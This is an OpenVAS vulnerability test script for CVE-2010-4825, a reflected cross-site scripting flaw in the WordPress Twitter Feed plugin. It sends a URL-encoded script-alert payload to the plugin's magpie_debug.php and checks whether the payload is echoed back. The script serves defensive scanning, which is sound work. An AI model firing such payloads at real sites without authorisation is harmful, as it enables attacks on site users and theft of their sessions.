###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Twitter Feed Plugin 'url' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100944");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)");
  script_cve_id("CVE-2010-4825");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Twitter Feed Plugin 'url' Parameter Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45294");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/WordPress.Twitter.Feed.0.3.1.Reflected.Cross-site.Scripting/68");

  script_tag(name:"summary", value:"The Twitter Feed Plugin for WordPress is prone to a cross-site
  scripting vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker
  to steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"Twitter Feed 0.3.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Remove Older version of Twitter Feed Plugin and Install Twitter Feed
  plugin version 1.0 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

cpe_list = make_list("cpe:/a:wordpress:wordpress", "cpe:/a:wordpress:wordpress_mu");

if(!infos = get_app_port_from_list(cpe_list:cpe_list, service:"www"))
  exit(0);

cpe  = infos["cpe"];
port = infos["port"];

if(!dir = get_app_location(cpe:cpe, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/wp-content/plugins/wp-twitter-feed/magpie/scripts/magpie_debug.php?url=%3cscript%3ealert('vt-xss-test')%3c%2fscript%3e");

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\('vt-xss-test'\)</script>", check_header:TRUE)) {
  report = http_report_vuln_url(url:url, port:port);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
